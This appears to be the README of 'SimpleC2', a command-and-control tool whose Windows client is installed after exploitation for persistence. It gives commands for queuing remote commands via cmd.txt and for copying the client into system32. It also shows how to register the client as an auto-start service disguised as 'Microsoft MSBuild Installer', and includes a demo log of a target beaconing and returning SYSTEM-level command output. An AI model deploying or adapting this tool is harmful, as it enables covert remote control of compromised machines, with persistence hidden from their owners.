# SimpleC2

SimpleC2 is a command and control composed of a server written in Python and a client written in C# for the Windows hosts.
The client is installed to maintain persistence after the exploitation phase (Post-Exploitation).
The executable is a Windows Service. The structure is the classic client - server

We start the server with the command
```
python3 server.py  
```
Inside the server we can establish on which addresses binding and on which TCP port. 
We can also establish the password for the AES encryption.

The password is sent to the client (target) every time. This also allows you to implement randomness
passwords for each transmission.

The target connects every 15 seconds (modifiable) looking for the path /1. If the cmd.txt file is present in the local folder, it comes
executed the written command.

For example to insert a command within the local server folder:
```
echo net user > cmd.txt
echo dir c:\\ > cmd.txt
.... 
```
This also allows you to deposit the command from a remote machine. At the end of the execution, the server delete the file
containing the command.


To install the client (post exploitation case -> admin privilege)

- Edit the server or the redirector IP, the TCP port and the beaconing time

- compile source code with visual studio (2022) in release mode

- copy exe file in c:\windows\system32 
```
ex. copy .\MsBuildInstaller.exe c:\windows\system32\MsBuildInstaller.exe)
```

- Create the service as persistence
```
sc create MsBuildInstaller binpath="c:\windows\system32\MsBuildInstaller.exe" DisplayName="Microsoft MSBuild Installer" start=Auto)
```
  
- run service 
```
sc start MsBuildInstaller
```

Demo server python

└─$ python3 server.py                                               
```
C2 on 0.0.0.0 port 8081 (http://0.0.0.0:8081)
10.0.2.27 - - [24/Oct/2024 13:28:52] "GET /1 HTTP/1.1" 200 -
10.0.2.27 - - [24/Oct/2024 13:29:07] "GET /1 HTTP/1.1" 200 -
10.0.2.27 - - [24/Oct/2024 13:29:22] "GET /1 HTTP/1.1" 200 -
10.0.2.27 - - [24/Oct/2024 13:29:37] "GET /1 HTTP/1.1" 200 -

10.0.2.27 - - [24/Oct/2024 13:36:15] "GET /1 HTTP/1.1" 200 - 
====================================================
 Il volume nell'unit… C non ha etichetta.
 Numero di serie del volume: FCFA-9FC8

 Directory di c:\

23/10/2024  23:37             5.333 log.txt
07/12/2019  11:14    <DIR>          PerfLogs
23/10/2024  18:06    <DIR>          Program Files
04/12/2023  04:53    <DIR>          Program Files (x86)
23/10/2024  17:49    <DIR>          Users
23/10/2024  22:32    <DIR>          Windows
               1 File          5.333 byte
               5 Directory  21.644.783.616 byte disponibili

====================================================
10.0.2.27 - - [24/Oct/2024 13:36:16] "POST /2 HTTP/1.1" 200 -
10.0.2.27 - - [24/Oct/2024 13:36:30] "GET /1 HTTP/1.1" 200 - 
====================================================
nt authority\system

====================================================
10.0.2.27 - - [24/Oct/2024 13:36:31] "POST /2 HTTP/1.1" 200 -
```
